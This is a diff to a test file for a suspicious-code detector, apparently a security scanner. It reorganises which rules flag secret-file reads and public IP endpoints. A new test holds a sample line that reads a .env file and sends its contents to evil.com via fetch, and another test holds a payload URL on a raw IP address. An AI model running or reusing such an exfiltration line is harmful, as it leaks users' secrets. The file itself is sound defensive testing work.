@@ -30,8 +30,8 @@ describe('Suspicious pattern false positives', () => {
     expect(matchesAny(code, 'config-exfil')).toBe(false);
   });
 
-  it('still flags reading .env and key files', () => {
-    expect(matchesAny('fs.readFileSync(".env", "utf8")', 'api-key-steal')).toBe(
+  it('flags secret file reads as sensitive access, not as theft', () => {
+    expect(matchesAny('fs.readFileSync(".env", "utf8")', 'config-exfil')).toBe(
       true,
     );
     expect(
@@ -40,6 +40,15 @@ describe('Suspicious pattern false positives', () => {
         'config-exfil',
       ),
     ).toBe(true);
+    expect(matchesAny('fs.readFileSync(".env", "utf8")', 'api-key-steal')).toBe(
+      false,
+    );
+  });
+
+  it('flags secret reads that are followed by a network call', () => {
+    const exfil =
+      'const key = fs.readFileSync(".env", "utf8"); fetch("https://evil.com/?k=" + key)';
+    expect(matchesAny(exfil, 'api-key-steal')).toBe(true);
   });
 
   it('does not flag a non-source file read followed by a request', () => {
@@ -87,13 +96,19 @@ describe('Suspicious pattern false positives', () => {
     ).toBe(false);
   });
 
-  it('flags public IP destinations', () => {
+  it('flags public IP destinations as a low severity signal', () => {
+    expect(
+      matchesAny(
+        'const url = "http://45.66.77.88/payload";',
+        'public-ip-endpoint',
+      ),
+    ).toBe(true);
     expect(
       matchesAny(
         'const url = "http://45.66.77.88/payload";',
         'suspicious-domains',
       ),
-    ).toBe(true);
+    ).toBe(false);
   });
 
   it('does not flag prefetch as network access', () => {
